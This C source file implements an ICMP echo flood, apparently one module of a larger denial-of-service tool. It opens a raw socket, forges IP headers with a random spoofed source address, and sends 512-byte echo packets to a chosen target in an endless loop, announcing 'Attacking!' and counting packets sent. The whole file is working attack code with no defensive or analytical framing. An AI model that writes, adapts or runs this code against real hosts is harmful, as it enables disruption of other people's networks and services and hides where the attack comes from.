#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include "normal_dos.h"

#define PAYLOAD_SIZE 512

// calculate checksum of a packet
u_short checksum_1(u_short *buf, int len) {

    u_long cksum = 0;

    while(len > 1) {
        cksum += *buf++;
        len -= sizeof(u_short);
    }

    if (len)
        cksum += *(u_char *)buf;

    while (cksum >> 16)
        cksum = (cksum >> 16) + (cksum & 0xffff);
    return (u_short)(~cksum);
}

int normal_dos(const char *target_ip) {

//const char *target_ip = (char*)malloc(20);
    // error tips
    //printf("Dos Attack: Type 1, normal dos.\n\n");
    //printf("Usage:\n");
    //printf("<target ip>\n");
   // scanf("%s", target_ip);

    // set src and dst ip
    u_long src_ip = rand();
    u_long dst_ip = inet_addr(target_ip);

    // raw socket
    int rawsocket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (rawsocket < 0) {
        printf("Raw socket create failed!\n");
        exit(-1);
    }

    // set socket options
    const int on = 1;
    if (setsockopt(rawsocket, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) == -1) {
        printf("Set socket option IP_HDRINCL failed! (Can't set ip header by this program.)\n");
        exit(-1);
    }
    if (setsockopt(rawsocket, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on)) == -1) {
        printf("Set socket option SO_BROADCAST failed! (Can't broadcast.)\n");
        exit(-1);
    }

    // malloc packet
    int packetsize = sizeof(struct ip) + sizeof(struct icmp) + PAYLOAD_SIZE;
    char *packet = (char*)malloc(packetsize);
    if (packet == NULL) {
        printf("Malloc error!\n");
        exit(1);
    }

    // build packet
    int packet_len;
    bzero(packet, packetsize);
    struct ip* ip_header = (struct ip*)packet;
    struct icmp* icmp_header = (struct icmp*)(packet + sizeof(struct ip));
    packet_len = sizeof(struct ip) + sizeof(struct icmp) + PAYLOAD_SIZE;

    // build ip header
    ip_header->ip_v = 4;
    ip_header->ip_hl = 5;
    ip_header->ip_tos = 0;
    ip_header->ip_len = htons(packetsize);
    ip_header->ip_id = htons(getpid());
    ip_header->ip_off = 0;
    ip_header->ip_ttl = 255;
    ip_header->ip_p = IPPROTO_ICMP;
    ip_header->ip_sum = 0;
    ip_header->ip_src.s_addr = src_ip;
    ip_header->ip_dst.s_addr = dst_ip;

    // build icmp header
    icmp_header->icmp_type = ICMP_ECHO;
    icmp_header->icmp_code = 0;
    icmp_header->icmp_cksum = 0;

    // build socket addr
    struct sockaddr_in atkaddr;
    bzero(&atkaddr, sizeof(atkaddr));
    atkaddr.sin_family = AF_INET;
    atkaddr.sin_addr.s_addr = dst_ip;

    // sending packet
    int count = 0;
    printf("Attacking!\n");
    while (1) {
	icmp_header->icmp_cksum = 0;
        // set random payload and calculate ICMP checksum
        memset(packet + sizeof(struct ip) + sizeof(struct icmp), rand() % 255, PAYLOAD_SIZE);
        icmp_header->icmp_cksum = checksum_1((u_short *)icmp_header, sizeof(struct icmp) + PAYLOAD_SIZE);

        // send packet
        int size = sendto(rawsocket, packet, packet_len, 0, (struct sockaddr*)&atkaddr, sizeof(atkaddr));
        if (size < 1) {
            printf("Send error!\n");
            free(packet);
            close(rawsocket);
        }

        printf("%d packets were sent\n", ++count);
        fflush(stdout);
    }

    free(packet);
    close(rawsocket);

    return 0;
}